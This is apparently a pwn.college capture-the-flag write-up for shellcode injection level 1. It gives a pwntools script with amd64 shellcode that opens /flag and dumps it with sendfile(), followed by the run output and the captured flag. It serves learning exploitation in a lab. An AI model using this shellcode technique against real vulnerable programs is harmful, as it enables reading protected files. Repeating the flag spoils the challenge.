# Level 1 

## Approach 

So I referred to the PWNcollege lectures by Professor Yan on shellcode injection before I started doing these challenges.

This was pretty straightforward challenge, we have to write shellcode for opening the "/flag" file and call the sendfile() syscall with the appropriate parameters.

`Sendfile()`

**ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);**

Basically, it's an efficient way to transfer data directly b/w file descriptors.

- **out-fd** - The file descriptor where data will be written

- **in_fd** - The file descriptor from which data is read

- **offset** - specifies the starting point of input(basically no. of pops before input is sent)

- **count** - no. of bytes to transfer


`open()`

takes two parameters - open(char *pathname, modes)

- Basic access modes:

O_RDONLY (0): Read only
O_WRONLY (1): Write only
O_RDWR (2): Read and write

So this is the script that I created 

```py 

from pwn import *

p = process('/challenge/babyshell-level-1')

context.arch = 'amd64'

script = asm('''
mov rbx, 0x00000067616c662f     # "/flag" in little endian format
push rbx                        # push the string into the stack
mov rax, 2                      # syscall for open
mov rdi, rsp                    # rsp is "/flag", we're moving this to rdi (1st argument)
mov rsi, 0                      # Second argument is 0 (Read Only)
syscall                         # Execute open() syscall

mov rdi, 1                      # 1st argument (rdi) to sendfile() is 1 i.e stdout FD
mov rsi, rax                    # Move opened file's fd from rax to rsi (i.e 2nd argument)
mov rdx, 0                      # 3rd argument indicates to skip 0 bytes from input
mov r10, 1000                   # 4th argument indicates to send 1000 bytes to output
mov rax, 40                     # syscall for sendfile
syscall                         # Execute sendfile() syscall

mov rax, 60                     # syscall for exit
syscall                         # Exit the program
''')

p.sendline(script)
p.interactive()

```

And from that I got this flag

``` 

hacker@shellcode-injection~level1:~$ python3 script.py
[+] Starting local process '/challenge/babyshell-level-1': pid 173
[*] Switching to interactive mode
[*] Process '/challenge/babyshell-level-1' stopped with exit code 1 (pid 173)
###
### Welcome to /challenge/babyshell-level-1!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffcc97a3460!
Reading 0x1000 bytes from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffcc97a3460 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffcc97a346a | 53                                            | push rbx
0x00007ffcc97a346b | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffcc97a3472 | 48 89 e7                                      | mov rdi, rsp
0x00007ffcc97a3475 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffcc97a347c | 0f 05                                         | syscall
0x00007ffcc97a347e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffcc97a3485 | 48 89 c6                                      | mov rsi, rax
0x00007ffcc97a3488 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffcc97a348f | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffcc97a3496 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffcc97a349d | 0f 05                                         | syscall
0x00007ffcc97a349f | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffcc97a34a6 | 0f 05                                         | syscall

Executing shellcode!

pwn.college{889uuKMUshCnE2r3KYf9MHOKZtj.01NxIDLzITO0czW}
```

## Flag 
`pwn.college{889uuKMUshCnE2r3KYf9MHOKZtj.01NxIDLzITO0czW}`

## My learning
- How to inject shellcode
- Working with syscalls such as open() and sendfile()

## Mistakes I made
- Initially sent "flag" instead of "/flag" which is basically the path to the file flag

## References
https://docs.google.com/presentation/d/1kkfh-dhgxfIZPB1ziyW2JQiC1MbQWn8c7e24kOoDxJ4/edit#slide=id.g9605bf3899_0_0